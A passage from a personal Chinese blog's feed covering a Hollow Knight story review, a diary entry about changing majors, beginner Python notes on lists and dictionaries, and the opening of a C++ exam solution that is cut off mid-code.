data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">白王的遗迹</span></div></div><p>幅光自然无法接受自己被白王击败的结局，于是，幅光利用梦境释放瘟疫感染圣巢内的虫子。在瘟疫的感染下，虫子们完全丧失了自主意识，只能进行基本且简单的思考。繁荣的圣巢，一刹那间成了死寂的废墟。在这里，只有无意识的虫子和瘟疫。</p><p>  但白王自然无法容忍这样事情的发生。他发现，圣巢内的蜂巢和螳螂村完全不受瘟疫感染。究其原因，是因为他们都有坚定的意志：蜂巢有自己的领袖信仰；而螳螂村，崇尚武力，他们的存在就是追求更高的荣耀。因此，他们不受瘟疫的感染。换句话说，只有真正的无意识或者坚定意志，才能免于幅光散播的瘟疫的感染。于是，容器就诞生了。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/evjUP.jpg" alt="击败BOSS后鞠躬表示敬意" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">击败BOSS后鞠躬表示敬意</span></div></div><p>  容器们的本体诞生于虚空，白色的头颅是容纳他们的虚空的自我的容器。他们源自虚空，所以完全没有个人的意志。他们的任务，就是对抗幅光的瘟疫，并永久地封印幅光，将圣巢变回原来的样子。但是，容器们并非都是可用的。容器必须没有自我意识，并且必须具有强大的能力。迈出深渊，就成为了容器们的第一道考验。深渊里，满是破碎的容器躯壳，他们都是白王失败的作品。但，有一个容器，成功通过了考验，迈出了深渊，完成了修炼。而他，就是纯粹容器，也叫<strong>空洞骑士</strong> 。</p><blockquote><p>没有可以思考的心智</p><p>没有可以屈从的意志</p><p>没有为苦难而哭泣的声音</p><p>生于神与虚空之手</p><p>你必封印在众人梦中散布瘟疫的障目之光</p><p>你是容器</p><p>你是空洞骑士</p></blockquote><p>  空洞骑士承载着白王的愿望，将幅光封印在自己体内，从而阻止瘟疫的扩散。事实证明，他也成功了。瘟疫在圣巢渐渐散去，满是僵尸的圣巢，又渐渐开始恢复往日的荣光。为了保证彻底的封印，白王号召了三位守梦者来加固封印。作为代价，三位守梦者会陷入永久地沉睡。为了纪念他们，白王在泪城的不同地方建立了纪念碑。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/eyoUC.jpg" alt="纪念空洞骑士" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">纪念空洞骑士</span></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/eyqyL.jpg" alt="守梦人纪念碑" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">守梦人纪念碑</span></div></div><p>  但是，令白王没想到的是，纯粹容器并不纯粹。苦痛之路的尽头告诉我们，空洞骑士与白王的朝夕相处已经使得空洞骑士对白王产生了亲情。同时，空洞骑士在深渊的回头，也表示他对兄弟产生了情感。不纯粹的容器，势必要被幅光所感染。对于幅光而言，存在于梦境之中的他如果不被同族所记住，那他就与死亡无异。幅光渐渐感染空洞骑士，挣脱了束缚，又重新向圣巢散播了瘟疫。而这次，设法从深渊逃离的小骑士感受到了同类的召唤，回到了圣巢。</p><p>  小骑士在圣巢的探索中，一步步揭开王国的过去，直面自己空虚的内在，背负起重建圣巢的责任。</p><p>  当然，游戏也有多个结局。其中一个便是小骑士击倒先辈(空洞骑士)，进入梦境，直面幅光。这是小骑士第二次庄严拔刀，也是最后一次。击败幅光后，小骑士会舍弃自己的容器，将自己的虚空之躯暴露在外，在前辈的配合之下击杀幅光。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://i.imgtg.com/2022/07/11/ey4QB.jpg" alt="击败幅光" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">击败幅光</span></div></div><p>从此，瘟疫散去，但圣巢也不如从前。封印幅光的黑巢中剩下的，只有小骑士残破的外壳。而小骑士完成了自己的实名，重新回到深渊的虚空之中。</p><hr /><p>  整个游戏其实蛮黑暗的。不论是结束后的音乐画面，还是黑暗战胜光芒的主线剧情(当然这里的光芒才是反派)，又或是小骑士和其他大部分NPC的结局，都让人觉得遗憾。在这个游戏中，满是衰落王国的萧瑟和主角的自我牺牲。游戏的最后，白宫依然只存在于守卫的梦境之中，鹿角站铃铛也不会再热闹起来，深渊的一切也回归虚空，蓝湖边只剩下一把骨钉…</p><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>  其实我的文笔也蛮烂的，也第一次整理剧情和时间线。希望大家可以多提提意见什么的。写这篇文章也主要是记录一点自己的感受，毕竟到现在想起这段故事还会觉得可惜和遗憾。但是这个游戏真的太优秀了！我真的强推。最后的最后还想和大家分享几个我喜欢的BGM！绝对入股不亏！</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1309394487&auto=1&height=66"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1309394512&auto=1&height=66"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1309394503&auto=1&height=66"></iframe>]]></content>
    
    
    <summary type="html">&lt;p&gt;这次打算写点不一样的，就来浅浅聊一下最近走完主线剧情的《Hollow Knight(空洞骑士)》吧。&lt;/p&gt;</summary>
    
    
    
    <category term="娱乐" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/"/>
    
    <category term="游戏简评" scheme="https://blog.snowflake.zone/categories/%E5%A8%B1%E4%B9%90/%E6%B8%B8%E6%88%8F%E7%AE%80%E8%AF%84/"/>
    
    
    <category term="游戏" scheme="https://blog.snowflake.zone/tags/%E6%B8%B8%E6%88%8F/"/>
    
    <category term="空洞骑士" scheme="https://blog.snowflake.zone/tags/%E7%A9%BA%E6%B4%9E%E9%AA%91%E5%A3%AB/"/>
    
  </entry>
  
  <entry>
    <title>6月24日</title>
    <link href="https://blog.snowflake.zone/posts/6/"/>
    <id>https://blog.snowflake.zone/posts/6/</id>
    <published>2022-06-23T16:00:00.000Z</published>
    <updated>2022-06-23T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>随便写写。</p><span id="more"></span><h2 id="写点东西或许以后会放出来"><a class="markdownIt-Anchor" href="#写点东西或许以后会放出来"></a> 写点东西，或许以后会放出来</h2><p>上个学期，大概是三月份的时候，无比期待着转专业。当时对于转专业的热情似乎有些太上头，以至于有一段时间满脑子都是转专业，甚至连上课都会思绪飘走。到了四月中旬，知道不能在平台内转专业后，便想着要不要去安泰。说实话，我当时发现自己下意识有了这个想法以后，就觉得自己可能不是那么想学某一专业，我可能更加是在找寻一种<strong>逃离</strong>。当时和另外一个朋友说了这个想法，确信了自己似乎在转专业这件事上<strong>走错了路</strong>，目的似乎已经改变了。于是，经过内心的斗争，还是放弃了四月份的自主转专业。（其实说实在话，也有一部分原因是害怕自己下半学期太摆，导致学积分疯狂后退，便想着赶紧趁着优势润了）</p><p>其实说实话，我很喜欢生医工的氛围。疫情期间更让我看清楚生医工拥有大院所比拟不了的人文关怀。这点其实很显然，我想不管是谁都能感觉出来。因为这个其实也有点动摇到我的转专业决心了，虽然不是主要原因。但我想过，如果我在大院，可能并不会有老师那么关注我，也不会在被转运的时候有学院领导来慰问我，也不会有班主任打电话了解学习状况，更不会有刚步入学生会就能参加很多重要活动的核心策划。我得到的许多我认为很重要的东西，其实并不是我能力多么强，纯粹是因为学院规模小，给予了我更多的机会而已。我害怕转专业后，来到陌生的环境，可能再也得不到生医工给我的归属感。</p><p>最近可以说是我转专业热情消退的最严重的一段时间了。我退出了夏季学期选的NIS的课程，也对当初满怀希望报名的PRP丧失信心。因为我无法在这两门课中找到充足的动力去学习它们。原因或许只是因为我对它们不感兴趣，但也未必那么简单。可能是经历了一学期的神经紧绷，拼命追求一个不错的绩点后的精疲力竭；也能是PRP的能力要求对我来说确实为时尚早；也可能是NIS的那门课的设计确实让人难以产生兴趣。如果是这两种，那还好，至少不是我对信安专业知识的麻木，但如果是第一种，那是否意味着，**在体验信安的学习过后，我已经提不起兴趣了呢？**这种无法将问题正确归因的状态导致我这两天都无所事事。于是，加上三四月份的内心挣扎，我会质问我自己：<strong>我真的想转专业吗？还是纯粹是一种突发的错觉？</strong></p><p>但是时间不等人。大二的上学期，我需要同时决定转不转专业、是否辅修；如果是，如何安排这两件事？我需要利用时间搜集资源和信息，但是暑假，我还有其他任务在身，并且，好好地休息。这太难以决定了。我发现上大学后，需要自己决定并且承受后果的事情太多了，而且这些事情往往只有一次机会，错过就不再来。如果用两个词形容我现在的处境，就是犹豫和纠结。</p><p>最近把<a href="/about/">关于我</a>页面的内容也做了一些修改，是因为我现在也不了解自己的想法。等到什么时候想明白了，再好好写吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随便写写。&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://blog.snowflake.zone/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="碎碎念" scheme="https://blog.snowflake.zone/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>Python学习笔记：列表和字典</title>
    <link href="https://blog.snowflake.zone/posts/5/"/>
    <id>https://blog.snowflake.zone/posts/5/</id>
    <published>2022-06-15T16:00:00.000Z</published>
    <updated>2022-06-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="作者序"><a class="markdownIt-Anchor" href="#作者序"></a> 作者序</h1><p>  学习一门编程语言，语法是最基础的。但是学习语法往往不是那么困难，因此，写一篇语法笔记似乎显得不是那么有必要。事实正如此，对于Python中的循环、判断等语句，我并没有整理的意图，因为我觉得太过多余，即使可以玩的很花。但是对于列表和字典这一章内容，其重要之处或许不在于其语法有多难，而是其体现了一些<strong>数据结构</strong>的思想。在C++中，线性表与这里的列表；查找表与这里的字典，都有着一些奇妙的联系。而因为Python很好的隐藏了一些底层实现，若不注意细节而使用这些内置函数和方法，是极有可能出错的。因此，本文将这些内容记录下来，既可以作为初学者的参考，又可以作为我的笔记以待后续查阅。</p><h1 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h1><h2 id="列表"><a class="markdownIt-Anchor" href="#列表"></a> 列表</h2><h3 id="什么是列表"><a class="markdownIt-Anchor" href="#什么是列表"></a> 什么是列表</h3><p>  Python中的列表是<strong>一系列特定元素按特定顺序构成的集合</strong>，这和C++中数组十分相似。对于列表，我们通常用<code>[]</code>来声明一个变量储存一个列表，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycles = [<span class="string">&#x27;trek&#x27;</span>, <span class="string">&#x27;cannondale&#x27;</span>, <span class="string">&#x27;redline&#x27;</span>, <span class="string">&#x27;specialized&#x27;</span>] <span class="comment">#初始化结束的列表</span></span><br><span class="line">empty = [] <span class="comment">#声明一个空列表</span></span><br></pre></td></tr></table></figure><h3 id="访问列表元素"><a class="markdownIt-Anchor" href="#访问列表元素"></a> 访问列表元素</h3><p>  和C++相类似的，Python支持根据元素下标来访问元素。例如对于上面的<code>bicycles</code>列表，我们可以用<code>bicycles[0]</code>来访问元素<code>'trek'</code>。当然了，Python支持使用负数索引来访问列表元素，例如访问上面列表中的<code>'specialized'</code>，我们除了使用<code>bicycles[3]</code>，还可以使用<code>bicycles[-1]</code>来访问这个元素。<strong>对于长度未知的列表，我们可以用这个方式来访问末尾的几个元素。</strong></p><h3 id="列表元素的修改-添加和删除"><a class="markdownIt-Anchor" href="#列表元素的修改-添加和删除"></a> 列表元素的修改、添加和删除</h3><p>  既然我们说列表是一种线性表，那么其需要能够支持线性表的基本操作。Python内置了丰富的函数和方法支持我们做到这些操作，下面逐一介绍之。</p><h4 id="修改元素"><a class="markdownIt-Anchor" href="#修改元素"></a> 修改元素</h4><p>  对于修改元素，我们可以直接指定列表元素下标修改之，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bicycles[<span class="number">0</span>] = <span class="string">&#x27;ducati&#x27;</span></span><br></pre></td></tr></table></figure><p>这样，我们就将列表中原本的<code>'trek'</code>元素修改成了我们指定的<code>'ducati'</code>元素。</p><h4 id="插入元素"><a class="markdownIt-Anchor" href="#插入元素"></a> 插入元素</h4><p>  对于插入元素，Python提供了两种方法，分别是<code>insert()</code>和<code>append()</code>。对于前者支持在指定位置插入元素，而后者是将元素插入到列表尾，例如下面代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bicycles = [<span class="string">&#x27;cannondale&#x27;</span>, <span class="string">&#x27;redline&#x27;</span>, <span class="string">&#x27;specialized&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(bicycles)</span><br><span class="line">bicycles.append(<span class="string">&#x27;ducati&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(bicycles)</span><br><span class="line">bicycles.insert(<span class="number">2</span>, <span class="string">&#x27;trek&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(bicycles)</span><br></pre></td></tr></table></figure><p>则对应的程序输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cannondale&#x27;, &#x27;redline&#x27;, &#x27;specialized&#x27;]</span><br><span class="line">[&#x27;cannondale&#x27;, &#x27;redline&#x27;, &#x27;specialized&#x27;, &#x27;ducati&#x27;]</span><br><span class="line">[&#x27;cannondale&#x27;, &#x27;redline&#x27;, &#x27;trek&#x27;, &#x27;specialized&#x27;, &#x27;ducati&#x27;]</span><br></pre></td></tr></table></figure><h4 id="删除元素"><a class="markdownIt-Anchor" href="#删除元素"></a> 删除元素</h4><p>  对于删除元素，一般有三种方法：<code>del</code>语句，<code>pop()</code>方法和<code>remove()</code>方法。</p><p>  对于<code>del</code>语句，你只需要指定删除的元素即可，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> bicycles[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>就是删除bicycles中的第一个元素。</p><p>  对于<code>pop()</code>方法，一般由两种使用方式：无参数和指定元素下标。对于无参数的<code>pop()</code>方法，会删除当前列表中的最后一个元素。这种模式下的<code>pop()</code>方法和之前提到过的<code>append()</code>方法可以天然的实现一个<strong>栈</strong>。或者，你也可以指定<code>pop()</code>的参数，例如<code>bicycles.pop(1)</code>，则其中的<code>'redline'</code>元素就会被移出列表。<code>pop()</code>方法具有返回值，返回值是被删除的元素。</p><p>  对于<code>remove()</code>方法，是查找列表中<strong>第一个和指定参数相同的值</strong>，将其删去。注意，由于只删除第一个查找到的值，因而如果我们要将指定参数的值都删去，需要使用循环，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">languages = [<span class="string">&#x27;cpp&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;go&#x27;</span>, <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;html&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> languages:</span><br><span class="line">    languages.remove(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(languages)</span><br></pre></td></tr></table></figure><p>这种方式下，可以将列表中的所有指定元素都删除。</p><h3 id="组织列表"><a class="markdownIt-Anchor" href="#组织列表"></a> 组织列表</h3><p>  除了基本的增删改查，我们对于列表还需要一些操作，这种操作不更改列表元素值，但是会更改元素之间的顺序。很便于使用的，Python依然为我们内置了强大的函数和方法来实现这些功能。</p><hr /><table><thead><tr><th style="text-align:center">函数名</th><th style="text-align:center">解释</th><th style="text-align:center">用法示例</th></tr></thead><tbody><tr><td style="text-align:center"><code>sort()</code>方法</td><td style="text-align:center">对列表永久非减（或非增）排列</td><td style="text-align:center"><code>bicycles.sort()</code>或者<code>bicycles.sort(reverse = True)</code></td></tr><tr><td style="text-align:center"><code>sorted()</code>函数</td><td style="text-align:center">对列表临时非减（或非增）排列</td><td style="text-align:center"><code>sorted(bicycles)</code>或者<code>sorted(bicycles, reverse = True)</code></td></tr><tr><td style="text-align:center"><code>reverse()</code>方法</td><td style="text-align:center">列表逆置</td><td style="text-align:center"><code>bicycles.reverse()</code></td></tr><tr><td style="text-align:center"><code>len()</code>函数</td><td style="text-align:center">列表求长</td><td style="text-align:center"><code>len(bicycles)</code></td></tr><tr><td style="text-align:center"><code>example[:]</code></td><td style="text-align:center">列表切片</td><td style="text-align:center"><code>bicycles[0:3]</code></td></tr></tbody></table><hr /><p>  注意，复制列表时，注意一下两种方式的区别：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foods1 = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;pizza&#x27;</span>, <span class="string">&#x27;hamburger&#x27;</span>]</span><br><span class="line">foods1 = foods2 <span class="comment">#这种复制是错误的</span></span><br><span class="line">foods1 = foods2[:] <span class="comment">#利用列表切片的方式复制</span></span><br></pre></td></tr></table></figure><p>第一种复制的结果是使得<code>foods1</code>和<code>foods2</code>指向了同一个列表，使得在更改<code>foods1</code>的列表元素时，<code>foods2</code>也会一同改变。而后者是两个互不干涉的、独立的列表。</p><h2 id="字典"><a class="markdownIt-Anchor" href="#字典"></a> 字典</h2><p>  Python中，字典是<strong>若干组键-值对的集合</strong>，其一般形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target = &#123;</span><br><span class="line">    <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;points&#x27;</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">&#x27;speed&#x27;</span>: <span class="string">&#x27;fast&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构建这样的键值对，我们可以通过键来访问其对应的值，有点类似于<strong>自定义下标的数组</strong>。上面示例中的<code>target</code>，就是我们说的字典。</p><h3 id="访问字典的值"><a class="markdownIt-Anchor" href="#访问字典的值"></a> 访问字典的值</h3><p>  如同上面所说，我们完全可以把其当成数组来用。如果我们要知道<code>target</code>的<code>color</code>信息，我们可以通过下面的代码输出它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(target[<span class="string">&#x27;color&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这时控制台输出<code>blue</code>。</p><h3 id="添加或修改键值对"><a class="markdownIt-Anchor" href="#添加或修改键值对"></a> 添加或修改键值对</h3><p>  这两点放在一起讲的原因是，两者的语法是相同的。请读者参见以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target[<span class="string">&#x27;color&#x27;</span>] = <span class="string">&#x27;red&#x27;</span> <span class="comment">#1</span></span><br><span class="line">target[<span class="string">&#x27;x_position&#x27;</span>] = <span class="number">4</span> <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>对于第一条语句，首先在字典<code>target</code>中寻找关键字<code>'color'</code>，由于找到的缘故，将其对应的值覆写为<code>'red'</code>。对于第二条语句，由于无法在字典中查询到<code>'x_position'</code>的任何记录，因而新建了一对键值关系，并将其插入了字典中。</p><h3 id="删除键值对"><a class="markdownIt-Anchor" href="#删除键值对"></a> 删除键值对</h3><p>  同样的，<code>del</code>语句给我们提供了删除键值对的方法。如果我们需要删除有关位置的信息，我们只需要<code>del target['x_position']</code>语句即可。</p><h3 id="遍历键值对"><a class="markdownIt-Anchor" href="#遍历键值对"></a> 遍历键值对</h3><p>  如果我们想遍历键值对，可以使用的最简单的语句是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> target.items():</span><br><span class="line">    <span class="built_in">print</span>(key + <span class="string">&quot; &quot;</span> + value)</span><br></pre></td></tr></table></figure><p>上述语句将字典中的每一个键值对，都分别把键、值赋值给了<code>key</code>和<code>value</code>。当然了，这时的输出顺序未必按照我们定义的一般按顺序输出，原因是<strong>字典只保证键值对的一一对应关系，而不在意互相之间的顺序问题</strong>。因此，要按照顺序遍历字典，我们需要使用其他的方式，</p><p>  对于字典，Python内置了两种方法：<code>keys()</code>方法和<code>values()</code>方法。两者返回的都是列表，前者是键组成的列表，后者是值组成的列表。相信到这里，你已经有思路如果按照顺序遍历字典了，这里给出一种方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favorite_language = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phli&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> person <span class="keyword">in</span> <span class="built_in">sorted</span>(favorite_language.keys()):</span><br><span class="line">    <span class="built_in">print</span>(person.title() + <span class="string">&quot;&#x27;s favorite language is &quot;</span> + favorite_language[person].title() + <span class="string">&quot;.&quot;</span>)</span><br></pre></td></tr></table></figure><p>上面的程序输出结果是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Edward&#x27;s favorite language is Ruby.</span><br><span class="line">Jen&#x27;s favorite language is Python.</span><br><span class="line">Phli&#x27;s favorite language is Python.</span><br><span class="line">Sarah&#x27;s favorite language is C.</span><br></pre></td></tr></table></figure><p>由此，我们做到了按照我们所想遍历字典。</p><h2 id="尾声"><a class="markdownIt-Anchor" href="#尾声"></a> 尾声</h2><p>  读者可以看到，Python中的列表和字典，其实已经包含了很多数据结构的东西，并且都给我们准备了不错的函数和方法。巧妙的是，这两个结构都可以自我嵌套，甚至互相嵌套，功能可以说已经非常强大了。因此，就像学习C++时刚接触到的函数一样，列表和字典也是水很深的内容之一。随着我的了解不断深入，我也会不断更新这篇文章。基础部分，就到此为止了。</p>]]></content>
    
    
    <summary type="html">Python中的列表和字典</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="语言" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://blog.snowflake.zone/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>数据结构试题分析</title>
    <link href="https://blog.snowflake.zone/posts/4/"/>
    <id>https://blog.snowflake.zone/posts/4/</id>
    <published>2022-05-28T13:26:28.000Z</published>
    <updated>2022-05-28T13:26:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="作者序"><a class="markdownIt-Anchor" href="#作者序"></a> 作者序</h3><p>  题目均来自于往年试卷，给出的代码都能够编译通过。</p><h3 id="例题一哈希表的使用"><a class="markdownIt-Anchor" href="#例题一哈希表的使用"></a> 例题一：哈希表的使用</h3><p>  <strong>题面：</strong> 假设线性表采用顺序存储结构，试实现函数int DelRepeat()，用以删除所有重复元素，并返回删除元素的个数。要求算法的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。线性表结构定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">seqList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span>* data;<span class="comment">//保存的元素数组</span></span><br><span class="line">    <span class="type">int</span> currentLength;<span class="comment">//元素个数</span></span><br><span class="line">    <span class="type">int</span> noData;<span class="comment">//数据中不存在的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">DelRepeat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//add your code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>  代码实现如下，注意：测试代码未给出，请读者自行构造。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">seqList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span>* data;<span class="comment">//保存的元素数组</span></span><br><span class="line">    <span class="type">int</span> currentLength;<span class="comment">//元素个数</span></span><br><span class="line">    <span class="type">int</span> noData;<span class="comment">//数据中不存在的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">seqList</span>(<span class="type">int</span> n)&#123;<span class="comment">//构造函数</span></span><br><span class="line">        currentLength=n;<span class="comment">//元素个数</span></span><br><span class="line">        data=<span class="keyword">new</span> <span class="type">int</span>[n];</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;input data:&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;<span class="comment">//获取元素值</span></span><br><span class="line">            cin&gt;&gt;data[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>&#123;<span class="comment">//展示数组元素</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;the data are:&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLength;++i)&#123;</span><br><span class="line">            cout&lt;&lt;data[i]&lt;&lt;<span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">delRepeat</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;<span class="comment">//删除重复元素</span></span><br><span class="line">        noData=n;<span class="comment">//标记输入数据中不存在的元素</span></span><br><span class="line">        <span class="type">bool</span>* status=<span class="keyword">new</span> <span class="type">bool</span>[currentLength];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLength;++i)&#123;<span class="comment">//创建判断元素，为真则该位置的数字出现过</span></span><br><span class="line">            